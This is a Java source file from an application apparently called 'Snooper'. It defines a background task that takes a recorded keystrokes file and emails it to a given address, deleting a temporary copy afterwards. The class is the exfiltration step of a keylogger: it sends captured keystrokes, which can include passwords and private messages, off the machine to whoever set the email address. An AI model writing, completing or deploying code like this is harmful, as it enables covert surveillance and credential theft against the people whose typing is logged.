package com.snooper.app;

import com.snooper.*;
import com.snooper.tray.*;

import javafx.concurrent.*;
import java.io.*;

public class SendEmailTask extends Task<Void> {
	
	private String emailTo;
	private SLogFile sLogFile;
	private boolean isTemp = false;
	
	public SendEmailTask(String emailTo, SLogFile sLogFile) {
		this.emailTo = emailTo;
		this.sLogFile = sLogFile;
	}
	
	@Override 
	protected Void call() {
		
		if (Util.isEmailValid(emailTo)) {
			if (sLogFile.isTemp()) {
				isTemp = true;
				
				File orig = Snooper.getInstance().getKeyStrokesFile();
				sLogFile.copyTo(orig);
				
				sLogFile = new SLogFile(orig);
			}
			
			Util.sendEmailSnoopLog(emailTo, sLogFile);
			
			if (isTemp) {
				sLogFile.getFile().delete();
			}
		}
		
		return null;
	}
	
	
}